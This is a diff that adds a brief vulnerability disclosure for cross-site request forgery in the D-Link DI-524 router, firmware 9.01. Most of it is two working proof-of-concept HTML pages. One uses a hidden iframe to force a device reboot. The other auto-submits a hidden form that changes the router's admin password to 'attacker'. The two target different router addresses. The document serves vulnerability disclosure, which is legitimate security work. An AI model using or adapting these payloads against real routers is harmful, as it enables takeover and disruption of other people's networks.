@@ -1,0 +1,38 @@
+Title: D-Link DI-524 - Cross-Site-Request-Forgery Vulnerability
+Credit: Felipe Soares de Souza
+Date: 09/12/2016
+Vendor: D-Link
+Product: D-Link DI-524 Wireless 150
+Product link: https://dlink.com.br/produto/di-524150
+Version: Firmware 9.01
+
+
+1- Reboot the device
+	<html>
+		<head>
+			<title>CSRF - Reboot the device</title>
+		</head>
+		<body>
+			<iframe width="1" height="1" src="http://192.168.0.1/cgi-bin/dial?rc=@&A=H&M=0&T=2000&rd=status"> </iframe>
+		</body>
+	</html>
+
+
+2- Change admin account
+
+	<html>
+		<head>
+			<title>CSRF - Change admin account</title>
+		</head>
+		<body>
+			<form method="POST" action="http://192.168.1.1/cgi-bin/pass">
+				<input type="hidden" name="rc" value="@atbox">
+				<input type="hidden" name="Pa" value="attacker">
+				<input type="hidden" name="p1" value="attacker">
+			</form>
+
+			<script type="text/javascript">
+				document.forms[0].submit();
+			</script>
+		</body>
+	</html>
